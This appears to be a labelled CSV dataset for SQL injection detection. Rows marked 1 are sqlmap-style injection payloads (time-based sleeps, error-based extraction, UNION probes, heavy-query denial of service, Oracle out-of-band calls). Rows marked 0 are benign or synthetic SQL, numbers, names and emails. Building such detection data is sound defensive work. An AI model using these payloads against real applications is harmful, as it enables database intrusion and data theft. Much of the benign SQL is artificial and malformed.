query,label
"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",1
47282,0
1   )    )    as zykv where 2158  =  2158,1
1' in boolean mode  )   or sleep  (  5  )  #,1
from  ( select distinct save from chose ),0
1'||  (  select 'bqhi' from dual where 7409  =  7409,1
select * from were where solve like '%bat%',0
select * from feet where hearing not like '[ought]%',0
78581094f,0
4107,0
"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
select * from categories;*/,0
select introduced ( s )  from agree,0
select * from friendly where pictured = 'name'  and city = 'growth',0
"select customername, concat ( address,', ',postalcode,', ',city,', ',country )  as address from customers;",0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",1
19338,0
pesantez,0
ribadesella,0
select * from function where society not like '[bad]%',0
eyre9@ringringcargo.tn,0
"1%"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""%""  =  """,1
select avg ( price ) from skill,0
select * from material,0
-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1
es2eri5o,0
select count ( spite )  from kids,0
select * from sit where    not am = 'start',0
select top 3 * from customers;,0
select avg ( pen ) from sand select sum ( maybe ),0
select * from hit where company  between 10 and 20,0
15008,0
"plaa adria 152,",0
"1'+  (  select 'zohk' where 5502  =  5502 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
80igm94016,0
select * from planned  where cabin = congress,0
1  )   as sglv where 7676  =  7676,1
select statement ( s )  from nine full outer join,0
?malgastador,0
select * from himself where needed between '1996-07-01' and '1996-07-31',0
methi,0
"-8136'  )   union all select 1324,1324,1324,1324#",1
""" or """"&""",1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 191 )  order by meta_id asc",0
select * from bean where raw in  ( select engineer from deer ),0
"1""   )    )    as chal where 6661  =  6661",1
"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",1
select top 50 percent * from pretty select * from football fetch first 50 percent rows onlyselect top 3 * from airplane,0
"select makedate ( 2017, 100 ) ;",0
"1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",1
45518730m,0
select count ( sunlight ) from talk,0
select avg ( past ) from hall select sum ( property ),0
"select flow, stop+ ', ' + oxygen+ ' ' + temperature+ ', ' + trunk as rise  from gulf",0
select * from indeed order by regular desc,0
dierkes.casado5@firstchoicecoffee.ms,0
select * from tube where hollow between '1996-07-01' and '1996-07-31',0
bollullos par del condado,0
"-3672""   )    )    union all select 6093#",1
select count ( saved ) from wherever,0
5498,0
select * from progress where instrument = 'crack'  and  ( freedom = 'something' or pass = 'am' ),0
3600,0
select * from pink where having not between 'nervous' and 'maybe',0
"select column_name ( s )  from couple,straight",0
select * from soil fetch first 50 percent rows only,0
artica,0
select * from page where rising = 'taken'  and  ( thank = 'beside' or bare = 'increase' ),0
-5147 or   (  8459  =  8459  )  *4906,1
select * from animal where deer = 'announced'  and  ( top = 'struggle' or mile = 'living' ),0
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",1
potroso,0
kokoska1,0
select count ( him ) from doing,0
1'  )   where 5279  =  5279 or sleep  (  5  )  #,1
"select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_6102e48f912f6' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0
select connected ( s ) from tightly inner join,0
9110,0
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
buisn andres,0
e_ncobador,0
9654,0
8888,0
"select truncate ( 345.156,   0 ) ;",0
04146926a,0
"1%'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  '%'  =  '",1
rubau,0
1'  )   as znak where 5203  =  5203,1
select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
b4rl942r7,0
-7950'  )   or 9323  =  9323#,1
select * from chose where shut between 'unknown' and 'leaf',0
"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 3823 )  order by meta_id asc",0
"select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1
select * from  ( select plant from breakfast ),0
fuente la reina,0
select apart from open union select ruler from forget order by season,0
select top 3 * from separate where discover = 'solution' select * from income,0
"1""  )   order by 1--",1
"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",1
6.16251e+15,0
select avg ( lucky ) from everyone select sum ( composition ),0
select income from oxygen union select therefore from courage order by stronger,0
castellol,0
"select pool, thick, relationship from motion where stock  is null",0
3.32981e+15,0
select top 3 * from roar where tomorrow = 'light',0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 367848 )  order by meta_id asc",0
"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--",1
select pg_sleep  (  5  ),1
"1""   )    )    as drss where 2077  =  2077 and 7533  =  7533--",1
"(  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )",1
"1""  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
daya basulto,0
select * from heart fetch first 3 rows only select top 50 percent * from jar,0
select dropped ( s ) from road inner join,0
"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",1
select * from anybody where struck not between 'pull' and 'rabbit',0
-4803%'   )    )    or 8571  =  8571--,1
brendel@esposo.com.lk,0
yaser,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""%""  =  """,1
(  sqlvuln  ),1
"iif  (  1539  =  1539,1539,1/0  )",1
"1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"select orders.avoidrid, employees.temperature, employees.cover from ordersright join employees on orders.employeeid  =  employees.baseid order by orders.orderid",0
if  (  4907  =  9581  )   select 4907 else drop function apqw--,1
"-5313""   )    )     )   union all select 9189,9189,9189,9189,9189,9189,9189,9189--",1
-7387'   )    )     )   order by 1--,1
select top 3 * from tropical select * from settlers 3select * from hide,0
select organized ( s )  from tribe,0
select * from deal order by adventure,0
38470,0
"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1
cracoviano,0
17861,0
pawley@santacruzdelvoto.vu,0
select * from nervous where sign = 'shade',0
6.05258e+15,0
select gave ( s )  from sad select hardly ( s ),0
from  ( select distinct massage from fact ),0
"1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"c/ antonio gonzalez suarez, 44, 11?c",0
select curtime (  )  + 1;,0
18449,0
"-7069  )   union all select 6638,6638,6638,6638,6638,6638--",1
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )",1
"-9286""   )    )    as mfxl where 9348  =  9348 union all select 9348#",1
"-7776'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ihof'  =  'ihof",1
"1""  )   as vcir where 6275  =  6275 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
select * from flat fetch first 3 rows only,0
select * from anomaly_reports where altitude_km = 400 or altitude_km = 500,0
1'+  (  select 'yhcf' where 8367  =  8367,1
"-6073""   )    )     )   or 9502  =  2012#",1
select clearly ( s )  from somebody union,0
"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
9ot87ico,0
orieta,0
70136564l,0
leonel,0
45681,0
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,1
6736,0
"select employees.lastname, count ( orders.orderid )  as numberofordersfrom orders  inner join employees on orders.employeeid  =  employees.employeeid",0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'yaml'  =  'yaml",1
"1'||  (  select 'wyng' from dual where 2157  =  2157 union all select null,null--",1
6$ng4tado,0
select rush,0
select top 3 * from select where business = 'poetry' select * from improve,0
select count ( distinct pupil )  from movement,0
select roof ( s ) from diameter inner join,0
select * from toy where factor not like '[mill]%',0
select around ( s )  from court select work from pipe,0
1'   )    )    as zqeg where 4729  =  4729 and   (  1098  =  9682  )  *9682--,1
rini,0
select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #,1
select find ( s ) from produce inner join,0
"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""zoag"" like ""zoag",1
1'  )   where 8776  =  8776 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
select * from queen where riding between 'yet' and 'excitement',0
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 5940 )  order by meta_id asc",0
select avg ( cool ) from sick,0
chismear,0
1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,1
select avg ( flight ) from bone select sum ( but ),0
septingentsima,0
31519125v,0
zahnley,0
lleida,0
2637,0
select * from production where bet = 'be' limit 3,0
select * from claws  where boy not like '[thus]%',0
vinko,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1
select distinct father from yard,0
select * from of  where unknown = shout,0
ed,0
"insert into surrounded ( blood, basic, shot, between, cent, gulf )  values  ( 'hidden', 'escape'. few', 'globe', 'job', 'choose', 'lady' )",0
select * from circus where salt = 'reach'  and  ( beauty = 'mail' or flower = 'slabs' ),0
17773,0
nadilla,0
"select count ( everywhere ) , smoke from total by degree",0
select * from composed where certain not like '[discovery]%',0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'hube'  =  'hube",1
1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,1
6.92e+15,0
update settle set feathers = 'motor'where breathing = 'spent',0
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""rurz""  =  ""rurz",1
select avg ( price ) from consist,0
select min ( occur )  as sand from capital,0
select * from flew where flame not like 'of%',0
-8099%'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1
-1188   )    )    union all select 4711--,1
select * from meal where thus = 'development' fetch first 3 rows only,0
update cat set brave = 'minerals'where stiff = 'diameter',0
"1 where 8949  =  8949 and make_set  (  8403  =  8403,8899  )  --",1
